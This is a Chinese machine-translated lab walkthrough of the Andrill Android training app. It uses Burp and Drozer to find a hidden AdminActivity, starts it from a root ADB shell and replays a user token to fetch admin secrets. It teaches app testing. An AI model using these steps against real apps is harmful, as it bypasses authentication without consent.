<html>
<head>
<title>Digging into Android Applications — Part 1 — Drozer + Burp</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">深入研究Android应用程序——第1部分——Drozer+Burp</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/digging-android-applications-part-1-drozer-burp-4fd4730d1cf2?source=collection_archive---------0-----------------------#2019-06-07">https://infosecwriteups.com/digging-android-applications-part-1-drozer-burp-4fd4730d1cf2?source=collection_archive---------0-----------------------#2019-06-07</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="ee61" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">你好，在这篇文章中，我将解决<a class="ae kl" href="https://github.com/Voorivex/Andrill" rel="noopener ugc nofollow" target="_blank">和</a>的第一部分:</p><blockquote class="km kn ko"><p id="f4bb" class="jn jo kp jp b jq jr js jt ju jv jw jx kq jz ka kb kr kd ke kf ks kh ki kj kk ij bi translated">Andrill是一个android移动应用程序，它与一个后端API进行交互，该API存在各种难度级别的漏洞。</p></blockquote><p id="0bdc" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">注意:这篇文章适合初学者，在Andrill的下一个级别，我将介绍挂钩技术、SSL pin旁路技术等等。然而，在这里我将介绍一些简单的原理和Drozer的快速测试。我将展示渗透测试人员如何从Android应用程序中列出<code class="fe kt ku kv kw b">hidden</code>和<code class="fe kt ku kv kw b">exporeted</code>活动，并正确调用它们。</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div class="gh gi kx"><img src="../Images/b0e9bf5eb4166e315a81178dcb709134.png" data-original-src="https://miro.medium.com/v2/resize:fit:1200/format:webp/1*hUIB6OvJPNLIAke75h8ilw.png"/></div></figure></div><div class="ab cl lf lg hu lh" role="separator"><span class="li bw bk lj lk ll"/><span class="li bw bk lj lk ll"/><span class="li bw bk lj lk"/></div><div class="ij ik il im in"><h1 id="8a49" class="lm ln iq bd lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf mg mh mi mj bi translated">规则</h1><p id="7ec3" class="pw-post-body-paragraph jn jo iq jp b jq mk js jt ju ml jw jx jy mm ka kb kc mn ke kf kg mo ki kj kk ij bi translated">这里有一些规则:</p><ol class=""><li id="05d9" class="mp mq iq jp b jq jr ju jv jy mr kc ms kg mt kk mu mv mw mx bi translated">该测试应被视为<code class="fe kt ku kv kw b">black-box</code></li><li id="223a" class="mp mq iq jp b jq my ju mz jy na kc nb kg nc kk mu mv mw mx bi translated">请<code class="fe kt ku kv kw b">DO NOT</code>审查源代码(NodeJS后端或Android的Java)</li><li id="8d81" class="mp mq iq jp b jq my ju mz jy na kc nb kg nc kk mu mv mw mx bi translated">因此，只有编译后的APK和远程服务器才是应该测试的范围。</li><li id="bdb5" class="mp mq iq jp b jq my ju mz jy na kc nb kg nc kk mu mv mw mx bi translated">登录凭证:<code class="fe kt ku kv kw b">james:james</code></li><li id="7b5b" class="mp mq iq jp b jq my ju mz jy na kc nb kg nc kk mu mv mw mx bi translated">目标是捕获应用程序流量，阅读管理员说明</li></ol></div><div class="ab cl lf lg hu lh" role="separator"><span class="li bw bk lj lk ll"/><span class="li bw bk lj lk ll"/><span class="li bw bk lj lk"/></div><div class="ij ik il im in"><h1 id="3e7a" class="lm ln iq bd lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf mg mh mi mj bi translated">开始黑客攻击</h1><p id="dcc3" class="pw-post-body-paragraph jn jo iq jp b jq mk js jt ju ml jw jx jy mm ka kb kc mn ke kf kg mo ki kj kk ij bi translated">安装阶段很容易，只需按照说明，浏览服务器的IP会给Android应用程序:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div class="gh gi nd"><img src="../Images/d1d8a36574eae1d34288e83875be4ec4.png" data-original-src="https://miro.medium.com/v2/resize:fit:1116/format:webp/1*LaZBiD_b8eIBYGYz1BuJ9Q.png"/></div></figure><p id="142a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">一些初始步骤:</p><ol class=""><li id="0f3d" class="mp mq iq jp b jq jr ju jv jy mr kc ms kg mt kk mu mv mw mx bi translated">代理Android box和服务器之间的打嗝</li><li id="3bea" class="mp mq iq jp b jq my ju mz jy na kc nb kg nc kk mu mv mw mx bi translated">在安卓盒子里安装安德里尔·APK</li></ol><p id="06e7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">之后，运行应用程序将提供一个登录屏幕:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="nf ng di nh bf ni"><div class="gh gi ne"><img src="../Images/327d19b8d4d5dd454d8211b5afacca56.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*5VIlvwIzWuoAwtdu_u4egw.png"/></div></div></figure><p id="6bbf" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">通过凭证<code class="fe kt ku kv kw b">james:james</code>登录将加载以下屏幕:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div class="gh gi nj"><img src="../Images/e8f5798b5d5a87e648d7894c74857435.png" data-original-src="https://miro.medium.com/v2/resize:fit:1070/format:webp/1*ADbx8xpNXR4x80eE8vXj2w.png"/></div></figure><p id="ac0e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">Burp中捕获的相应HTTP请求:</p><pre class="ky kz la lb gt nk kw nl nm aw nn bi"><span id="bdff" class="no ln iq kw b gy np nq l nr ns">POST /authenticate HTTP/1.1<br/>Content-Type: application/json<br/>Content-Length: 39<br/>Host: 192.168.1.8:8081<br/>Connection: close<br/>Accept-Encoding: gzip, deflate<br/>User-Agent: okhttp/3.10.0</span><span id="e932" class="no ln iq kw b gy nt nq l nr ns">{"password":"james","username":"james"}</span><span id="6f36" class="no ln iq kw b gy nt nq l nr ns">HTTP/1.1 200 OK<br/>X-Powered-By: Express<br/>Content-Type: application/json<br/>Date: Fri, 07 Jun 2019 22:45:35 GMT<br/>Connection: close<br/>Content-Length: 110</span><span id="637f" class="no ln iq kw b gy nt nq l nr ns">{"user_id":"3","display_name":"James",<strong class="kw ir">"login_token":"f686a930-8975-11e9-9714-d7315930c699"</strong>,"status":"success"}</span></pre><p id="5e0d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">加载用户内容:</p><pre class="ky kz la lb gt nk kw nl nm aw nn bi"><span id="13b9" class="no ln iq kw b gy np nq l nr ns">POST /back-end HTTP/1.1<br/><strong class="kw ir">auth_token: f686a930-8975-11e9-9714-d7315930c699</strong><br/>Content-Type: application/json<br/>Content-Length: 25<br/>Host: 192.168.1.8:8081<br/>Connection: close<br/>Accept-Encoding: gzip, deflate<br/>User-Agent: okhttp/3.10.0</span><span id="6524" class="no ln iq kw b gy nt nq l nr ns">{"action":"get_contents"}</span><span id="779d" class="no ln iq kw b gy nt nq l nr ns">HTTP/1.1 200 OK<br/>X-Powered-By: Express<br/>Content-Type: application/json<br/>Date: Fri, 07 Jun 2019 22:45:35 GMT<br/>Connection: close<br/>Content-Length: 83</span><span id="bbcc" class="no ln iq kw b gy nt nq l nr ns">{"user_contents":"This is a public note every user can see it.","status":"success"}</span></pre><p id="6f96" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">应用程序使用身份验证响应中收到的login_token。这一阶段有两种方法:</p><ol class=""><li id="e4b2" class="mp mq iq jp b jq jr ju jv jy mr kc ms kg mt kk mu mv mw mx bi translated">反编译APK并在源代码中寻找漏洞</li><li id="7b7d" class="mp mq iq jp b jq my ju mz jy na kc nb kg nc kk mu mv mw mx bi translated">通过Drozer分析应用</li></ol><p id="eebd" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在本演练中，我选择第二个。</p><h1 id="fb64" class="lm ln iq bd lo lp nu lr ls lt nv lv lw lx nw lz ma mb nx md me mf ny mh mi mj bi translated">德罗泽，快快快</h1><p id="9774" class="pw-post-body-paragraph jn jo iq jp b jq mk js jt ju ml jw jx jy mm ka kb kc mn ke kf kg mo ki kj kk ij bi translated">Drozer有几个功能，我跳过安装等。列出设备:</p><pre class="ky kz la lb gt nk kw nl nm aw nn bi"><span id="4c24" class="no ln iq kw b gy np nq l nr ns">&gt;drozer console devices<br/>List of Bound Devices</span><span id="24f4" class="no ln iq kw b gy nt nq l nr ns">Device ID         Manufacturer         Model                 Software<br/>9a302eb7b9185467  unknown              Samsung Galaxy S6 - 5.0.0 - API 21 - 1440x2560  5.0</span></pre><p id="f88a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">连接到设备:</p><pre class="ky kz la lb gt nk kw nl nm aw nn bi"><span id="ba99" class="no ln iq kw b gy np nq l nr ns">&gt;drozer console connect<br/>Selecting 9a302eb7b9185467 (unknown Samsung Galaxy S6 - 5.0.0 - API 21 - 1440x2560 5.0)</span><span id="69a2" class="no ln iq kw b gy nt nq l nr ns">..                    ..:.<br/>           ..o..                  .r..<br/>            ..a..  . ....... .  ..nd<br/>              ro..idsnemesisand..pr<br/>              .otectorandroidsneme.<br/>           .,sisandprotectorandroids+.<br/>         ..nemesisandprotectorandroidsn:.<br/>        .emesisandprotectorandroidsnemes..<br/>      ..isandp,..,rotectorandro,..,idsnem.<br/>      .isisandp..rotectorandroid..snemisis.<br/>      ,andprotectorandroidsnemisisandprotec.<br/>     .torandroidsnemesisandprotectorandroid.<br/>     .snemisisandprotectorandroidsnemesisan:<br/>     .dprotectorandroidsnemesisandprotector.</span><span id="da21" class="no ln iq kw b gy nt nq l nr ns">drozer Console (v2.4.4)<br/>dz&gt;</span></pre><p id="c4da" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">以下命令显示安装在电话上的软件包:</p><pre class="ky kz la lb gt nk kw nl nm aw nn bi"><span id="50f4" class="no ln iq kw b gy np nq l nr ns">dz&gt; run app.package.list<br/>...<br/>com.android.providers.settings (Settings Storage)<br/>com.android.captiveportallogin (CaptivePortalLogin)<br/><strong class="kw ir">com.example.andrill_1 (Andrill-1)</strong><br/>...<br/>dz&gt;</span></pre><p id="dd48" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们的Andrill应用程序已经成功加载。获取有关包的信息:</p><pre class="ky kz la lb gt nk kw nl nm aw nn bi"><span id="28fc" class="no ln iq kw b gy np nq l nr ns">dz&gt; run app.package.info -a com.example.andrill_1<br/>Package: com.example.andrill_1<br/>  Application Label: Andrill-1<br/>  Process Name: com.example.andrill_1<br/>  Version: 1.0<br/>  Data Directory: /data/data/com.example.andrill_1<br/>  APK Path: /data/app/com.example.andrill_1-1/base.apk<br/>  UID: 10064<br/>  GID: [3003]<br/>  Shared Libraries: null<br/>  Shared User ID: null<br/>  Uses Permissions:<br/>  - android.permission.INTERNET<br/>  Defines Permissions:<br/>  - None</span></pre><p id="4073" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这里，我不打算讨论Drozer提供的攻击面，收集所有活动:</p><pre class="ky kz la lb gt nk kw nl nm aw nn bi"><span id="2258" class="no ln iq kw b gy np nq l nr ns">dz&gt; run app.activity.info -a com.example.andrill_1 -i -u<br/>Package: com.example.andrill_1<br/>  Exported Activities:<br/>    com.example.andrill_1.SplashScreen<br/>      Permission: null<br/>      Intent Filter:<br/>        Actions:<br/>          - android.intent.action.MAIN<br/>        Categories:<br/>          - android.intent.category.LAUNCHER<br/>  <strong class="kw ir">Hidden Activities:</strong><br/>    com.example.andrill_1.LoginActivity<br/>      Permission: null<br/>    com.example.andrill_1.UserActivity<br/>      Permission: null<br/>    <strong class="kw ir">com.example.andrill_1.AdminActivity</strong><br/>      Permission: null<br/>    com.example.andrill_1.ServerActivity<br/>      Permission: null</span></pre><p id="2193" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">正如所看到的，有四个隐藏的活动。<code class="fe kt ku kv kw b">AdminActivity</code>看起来很有趣。调用活动:</p><pre class="ky kz la lb gt nk kw nl nm aw nn bi"><span id="f2f1" class="no ln iq kw b gy np nq l nr ns">dz&gt; run app.activity.start --component com.example.andrill_1 com.example.andrill_1.AdminActivity<br/><strong class="kw ir">Permission Denial</strong>: starting Intent { flg=0x10000000 cmp=com.example.andrill_1/.AdminActivity (has extras) } from ProcessRecord{37c6394b 2473:com.mwr.dz:remote/u0a65} (pid=2473, uid=10065) not exported from uid 10064</span></pre><p id="5414" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">由于该活动未导出，因此Drozer无法调用该活动。但是，从根ADB shell将成功调用:</p><pre class="ky kz la lb gt nk kw nl nm aw nn bi"><span id="07a2" class="no ln iq kw b gy np nq l nr ns">127|root@vbox86p:/ # am start -n com.example.andrill_1/.AdminActivity<br/>Starting: Intent { cmp=com.example.andrill_1/.AdminActivity }</span></pre><p id="56e9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">就在上面的命令之后，打嗝截获了一个请求:</p><pre class="ky kz la lb gt nk kw nl nm aw nn bi"><span id="9922" class="no ln iq kw b gy np nq l nr ns">POST /back-end HTTP/1.1<br/>Content-Type: application/json<br/>Content-Length: 29<br/>Host: 192.168.1.8:8081<br/>Connection: close<br/>Accept-Encoding: gzip, deflate<br/>User-Agent: okhttp/3.10.0</span><span id="dc41" class="no ln iq kw b gy nt nq l nr ns">{"action":"get_admin_secret"}</span></pre><p id="b6f4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">结果是:</p><pre class="ky kz la lb gt nk kw nl nm aw nn bi"><span id="a2e2" class="no ln iq kw b gy np nq l nr ns">HTTP/1.1 200 OK<br/>X-Powered-By: Express<br/>Content-Type: application/json<br/>Date: Fri, 07 Jun 2019 22:52:54 GMT<br/>Connection: close<br/>Content-Length: 58</span><span id="36b9" class="no ln iq kw b gy nt nq l nr ns">{"reason":"Invalid token was provided.","status":"failed"}</span></pre><p id="be67" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">添加身份验证令牌:</p><pre class="ky kz la lb gt nk kw nl nm aw nn bi"><span id="709c" class="no ln iq kw b gy np nq l nr ns">POST /back-end HTTP/1.1<br/>Content-Type: application/json<br/><strong class="kw ir">auth_token: f686a930-8975-11e9-9714-d7315930c699<br/></strong>Content-Length: 29<br/>Host: 192.168.1.8:8081<br/>Connection: close<br/>Accept-Encoding: gzip, deflate<br/>User-Agent: okhttp/3.10.0</span><span id="3ecd" class="no ln iq kw b gy nt nq l nr ns">{"action":"get_admin_secret"}</span></pre><p id="de9b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">结果是:</p><pre class="ky kz la lb gt nk kw nl nm aw nn bi"><span id="061b" class="no ln iq kw b gy np nq l nr ns">HTTP/1.1 200 OK<br/>X-Powered-By: Express<br/>Content-Type: application/json<br/>Date: Fri, 07 Jun 2019 22:58:52 GMT<br/>Connection: close<br/>Content-Length: 72</span><span id="43ee" class="no ln iq kw b gy nt nq l nr ns"><strong class="kw ir">{"admin_contents":"Admins secret contents revealed.","status":"success"}</strong></span></pre><p id="8658" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这一部分已经完成，我已经看到一些重要的商业应用程序遭受了提到的缺陷。在一个案例中，一个互联网移动应用程序有一个手指触摸认证，虽然活动可以通过上面提到的方法调用，所以我可以绕过本地认证。请随时留下评论，并为安德里尔水平提出建议。</p></div></div>    
</body>
</html>